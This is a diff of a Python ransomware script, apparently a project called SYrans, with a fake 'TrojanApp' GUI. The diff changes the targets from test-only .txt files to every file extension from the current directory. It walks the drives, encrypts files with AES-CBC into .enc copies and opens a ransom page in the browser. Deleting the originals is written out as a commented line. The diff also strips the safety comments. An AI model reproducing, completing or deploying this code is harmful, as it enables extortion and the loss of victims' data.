@@ -3,20 +3,25 @@ import os, random, struct, hashlib, time, win32api, webbrowser, ttk
 import Tkinter as tk
 from Tkinter import *
 from Crypto.Cipher import AES
-#test 
-extensions = ['.txt'] # Testing only with txt files
-homedir = "C:\Users\Python\Desktop\docu" #Testing only under this directory
+
+
+extensions = ['.'] #File extensions to be encrypted, use wildcard * for all
+homedir = "./" #Starting directory
+
 path = os.path.join(homedir, "firstdir")
-url = "https://github.com/luisxciv/SYrans" #Ransom page to display with price, BTC address etc...
+url = "https://github.com/luisxciv/SYrans" #Ransom page
 new = 2 # opens in new tab (if possible)
+
 LARGE_FONT= ("Courier", 10)
+
+#main enryption function
 
 def encryption(key):
     app = TrojanApp()
     app.geometry('500x420')
     app.mainloop()
 
-    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]: #I used this snipper to list the currently in-use driver letters of windows
+    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
         for root, dirs, files in os.walk(homedir):
             for file in files:
                 if file.endswith(tuple(extensions)):
@@ -30,11 +35,10 @@ def encryption(key):
                     # Encrypts the file and adds .enc extension
                     encrypt(key,in_filename)
                     print "[+] - Files are now encrypted."
-                    #
 
                     print "[!] - Deleting Original Files..."
-                    # Uncomment the line below to remove the original files (If you don't know how to decrypt with python using AES 256-CBC then dont uncomment.
-                   # os.remove(os.path.join(root, file))
+                    # line below deletes original unencrypted files
+                    # os.remove(os.path.join(root, file))
                     #print "[+] - Original files deleted."
     
                     #Proceeds to next dir
@@ -45,10 +49,10 @@ def encryption(key):
 
     print "[+] - All files are now encrypted and replaced with a .enc file extension"
 
-    #we call the url to be displayed to the user
     webbrowser.open(url, new=new)
 
-#Encryption algorythm (AES-CBC 256) taken from stackoverflow
+
+
 def encrypt(key, in_filename, out_filename=None, chunksize=64*1024):
     if not out_filename:
         out_filename = in_filename + '.enc'
@@ -76,7 +80,7 @@ def cancel():
 
 LARGE_FONT = ("Verdana", 12)
 
-#Fake graphical user interface with a custom message and buttons sample used from web searching
+
 
 class TrojanApp(tk.Tk):
     def __init__(self, *args, **kwargs):
@@ -119,7 +123,7 @@ class StartPage(tk.Frame):
         txt.insert("3.0",
                    " I am not responsible for whatever you decide to do with this code, \n")
         txt.insert("4.0",
-                   " Original repo: https://github.com/luisxciv/SYrans, \n")
+                   " Original repo: https://github.com/luisxciv/Syrans, \n")
         txt.config(font=("consolas", 11), undo=True, wrap='word', state="disabled")
         txt.grid(row=0, column=0, sticky="ew", padx=2, pady=2)
         txt.pack()
@@ -176,4 +180,3 @@ def password():
 def main():
     password()
 main()
-# Please dont be an idiot and use this for illegal purposes
